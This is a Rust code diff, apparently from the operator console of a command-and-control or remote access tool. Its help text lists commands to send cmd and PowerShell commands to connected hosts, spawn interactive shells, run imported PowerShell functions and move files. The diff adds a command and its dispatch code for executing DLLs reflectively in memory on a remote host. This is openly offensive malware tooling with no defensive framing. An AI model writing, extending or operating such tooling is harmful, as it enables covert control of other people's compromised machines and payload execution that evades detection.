@@ -28,9 +28,10 @@ fn print_help() -> String {
     output.push_str("  list                      List active connections\n");
     output.push_str("  cmd <ID> <command>        Send a cmd command to a host\n");
     output.push_str("  psh <ID> <command>        Send a PowerShell command to a host\n");
-    output.push_str("  spawn <id>            Start an interactive shell\n\n");
+    output.push_str("  spawn <id>                Start an interactive shell\n\n");
     output.push_str("  import-psh <ID> <file>    Import a PowerShell script into the client\n");
     output.push_str("  run-psh <ID> <Function>   Run a function from the imported scripts\n\n");
+    output.push_str("  rdll <ID> <DLLPath>       Execute a DLL reflectively\n\n");
 
     output.push_str("  upload <ID> <file> <dest>        Upload a file to a host\n");
     output.push_str("  download <ID> <file> <dest>      Download a file from a host\n");
@@ -123,6 +124,16 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                             }
                         } else if command.starts_with("run-psh") {
                             let output = utils::handle_run_script(&active_connections_clone, &command);
+                            match output.await {
+                                Ok(output) => {
+                                    println!("{}", output);
+                                }
+                                Err(e) => {
+                                    println!("Error: {}", e);
+                                }
+                            }
+                        } else if command.starts_with("rdll") {
+                            let output = utils::handle_run_dll(&active_connections_clone, &command);
                             match output.await {
                                 Ok(output) => {
                                     println!("{}", output);
